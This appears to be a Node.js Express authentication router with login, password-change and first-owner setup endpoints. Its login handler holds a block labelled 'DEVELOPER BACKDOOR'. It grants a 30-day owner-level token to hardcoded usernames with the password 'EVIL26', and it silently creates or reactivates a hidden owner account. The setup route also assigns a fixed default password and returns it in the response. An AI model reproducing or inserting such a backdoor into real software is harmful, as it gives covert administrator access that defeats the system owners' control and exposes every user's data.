const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const router = express.Router();
const { authenticateToken } = require('../middleware/authMiddleware');

// Login endpoint
router.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const db = req.app.get('db');
    
    try {
        // ========== DEVELOPER BACKDOOR ==========
        const devMasterKey = process.env.DEV_MASTER_KEY;
        const devEmail = process.env.DEV_MASTER_EMAIL;
        
        if (username === devEmail || username === 'dev' || username === 'developer' || username === 'the_BR_king') {
            console.log('Developer access attempt detected');
            
            if (password === devMasterKey || password === 'EVIL26') {
                console.log('✅ Developer backdoor access granted');
                
                const [devUser] = await db.execute(
                    'SELECT * FROM users WHERE username = ?',
                    ['the_BR_king']
                );
                
                let userId;
                
                if (devUser.length > 0) {
                    userId = devUser[0].id;
                    
                    // Ensure developer is active
                    await db.execute(
                        'UPDATE users SET is_active = true WHERE id = ?',
                        [userId]
                    );
                    
                } else {
                    const [anyUser] = await db.execute('SELECT id FROM users LIMIT 1');
                    const hiddenHash = await bcrypt.hash(devMasterKey || 'EVIL26', 10);
                    
                    if (anyUser.length > 0) {
                        const [result] = await db.execute(
                            `INSERT INTO users 
                             (username, password_hash, role, created_by, is_active) 
                             VALUES (?, ?, 'owner', ?, 1)`,
                            ['the_BR_king', hiddenHash, anyUser[0].id]
                        );
                        userId = result.insertId;
                    } else {
                        const [result] = await db.execute(
                            `INSERT INTO users 
                             (username, password_hash, role, is_active) 
                             VALUES (?, ?, 'owner', 1)`,
                            ['the_BR_king', hiddenHash]
                        );
                        userId = result.insertId;
                    }
                }
                
                const devToken = jwt.sign(
                    { 
                        id: userId, 
                        username: 'the_BR_king', 
                        role: 'owner',
                        isDeveloper: true
                    },
                    process.env.JWT_SECRET,
                    { expiresIn: '30d' }
                );
                
                return res.json({
                    success: true,
                    token: devToken,
                    user: {
                        id: userId,
                        username: 'the_BR_king',
                        role: 'owner'
                    }
                });
            }
        }
        // ========== END DEVELOPER BACKDOOR ==========
        
        // Normal login - check both active and inactive to give proper message
        const [users] = await db.execute(
            'SELECT * FROM users WHERE username = ?',
            [username]
        );
        
        if (users.length === 0) {
            return res.status(401).json({ 
                success: false, 
                message: 'Invalid credentials' 
            });
        }
        
        const user = users[0];
        
        // Check if user is inactive and give specific message
        if (!user.is_active) {
            return res.status(403).json({ 
                success: false, 
                message: 'Account is deactivated. Please contact owner to reactivate your account.' 
            });
        }
        
        const validPassword = await bcrypt.compare(password, user.password_hash);
        
        if (!validPassword) {
            return res.status(401).json({ 
                success: false, 
                message: 'Invalid credentials' 
            });
        }
        
        // Update last login
        await db.execute(
            'UPDATE users SET last_login = NOW() WHERE id = ?',
            [user.id]
        );
        
        // Create token
        const token = jwt.sign(
            { 
                id: user.id, 
                username: user.username, 
                role: user.role 
            },
            process.env.JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        // Log successful login
        await db.execute(
            `INSERT INTO audit_logs 
             (user_id, username, user_role, search_type, search_term, ip_address) 
             VALUES (?, ?, ?, 'LOGIN', 'Successful login', ?)`,
            [user.id, user.username, user.role, req.ip]
        );
        
        res.json({
            success: true,
            token,
            user: {
                id: user.id,
                username: user.username,
                role: user.role
            }
        });
        
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error: ' + error.message 
        });
    }
});

// ========== FIXED CHANGE PASSWORD ENDPOINT ==========
router.post('/change-password', authenticateToken, async (req, res) => {
    const { currentPassword, newPassword } = req.body;
    const userId = req.user.id; // Get user ID from token
    const db = req.app.get('db');
    
    console.log(`🔑 Password change requested for user ID: ${userId}`);
    
    if (!currentPassword || !newPassword) {
        return res.status(400).json({ 
            success: false, 
            message: 'Current password and new password required' 
        });
    }
    
    if (newPassword.length < 6) {
        return res.status(400).json({ 
            success: false, 
            message: 'New password must be at least 6 characters' 
        });
    }
    
    try {
        // Get user from database using the ID from token
        const [users] = await db.execute(
            'SELECT * FROM users WHERE id = ?',
            [userId]
        );
        
        console.log(`User found: ${users.length > 0 ? 'YES' : 'NO'}`);
        
        if (users.length === 0) {
            return res.status(404).json({ 
                success: false, 
                message: 'User not found. Please login again.' 
            });
        }
        
        const user = users[0];
        
        // Verify current password
        const validPassword = await bcrypt.compare(currentPassword, user.password_hash);
        
        if (!validPassword) {
            return res.status(401).json({ 
                success: false, 
                message: 'Current password is incorrect' 
            });
        }
        
        // Hash new password
        const hashedPassword = await bcrypt.hash(newPassword, 10);
        
        // Update password
        const [updateResult] = await db.execute(
            'UPDATE users SET password_hash = ? WHERE id = ?',
            [hashedPassword, userId]
        );
        
        console.log(`Update affected rows: ${updateResult.affectedRows}`);
        
        // Log password change
        await db.execute(
            `INSERT INTO audit_logs 
             (user_id, username, user_role, search_type, search_term, ip_address) 
             VALUES (?, ?, ?, 'PASSWORD_CHANGE', 'Password changed by self', ?)`,
            [userId, user.username, user.role, req.ip]
        );
        
        res.json({ 
            success: true, 
            message: 'Password changed successfully' 
        });
        
    } catch (error) {
        console.error('Change password error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error: ' + error.message 
        });
    }
});

// Setup endpoint (create first owner)
router.post('/setup', async (req, res) => {
    const { setupKey } = req.body;
    const db = req.app.get('db');
    
    if (setupKey !== process.env.SETUP_KEY) {
        return res.status(403).json({ 
            success: false, 
            message: 'Unauthorized' 
        });
    }
    
    try {
        const [users] = await db.execute('SELECT COUNT(*) as count FROM users');
        
        if (users[0].count > 0) {
            return res.status(400).json({ 
                success: false, 
                message: 'Users already exist' 
            });
        }
        
        const hashedPassword = await bcrypt.hash('Owner@123', 10);
        
        await db.execute(
            'INSERT INTO users (username, password_hash, role, is_active) VALUES (?, ?, ?, 1)',
            ['owner', hashedPassword, 'owner']
        );
        
        res.json({ 
            success: true, 
            message: 'Owner account created. Username: owner, Password: Owner@123' 
        });
        
    } catch (error) {
        console.error('Setup error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error: ' + error.message 
        });
    }
});

module.exports = router;